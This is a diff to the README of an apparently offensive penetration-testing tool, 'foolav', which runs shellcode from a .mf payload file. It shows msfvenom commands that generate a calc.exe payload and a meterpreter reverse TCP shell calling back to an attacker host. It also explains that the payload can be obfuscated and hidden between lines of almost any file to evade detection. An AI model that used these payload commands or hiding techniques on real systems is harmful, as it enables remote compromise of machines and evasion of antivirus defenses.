@@ -7,7 +7,7 @@ Executable compiled with this code is useful during penetration tests where ther
 1. prepare your payload (x86), i.e.
    
    calc: ```
-msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff" -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf```
+msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff" -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf``` (you dont really need to use any encoder or characters blacklisting, it will work anyway)
    
    meterpreter: ```
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=... -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf```
@@ -27,7 +27,7 @@ msfvenom -p windows/meterpreter_reverse_tcp LHOST=... -a x86 -f c 2>/dev/null | 
 
   ![meter](https://cloud.githubusercontent.com/assets/4956006/12372509/aa21a00e-bc5a-11e5-8589-98ee8ce8bfc0.png)
 
-- parser of .mf payload file will ignore every character other than `\xHH` hexdecimal sequences. This means, it can append your payload t almost any file, hide it between the lines or even add your own comments, example:
+- parser of .mf payload file can be obfuscated - it will ignore every character other than `\xHH` hexdecimal sequences. This means, it can append your payload to almost any file, hide it between the lines or even add your own comments, example:
 
 ![obfuscation](https://cloud.githubusercontent.com/assets/4956006/12372526/ca361694-bc5b-11e5-9a31-be6847cdcec2.png)
 
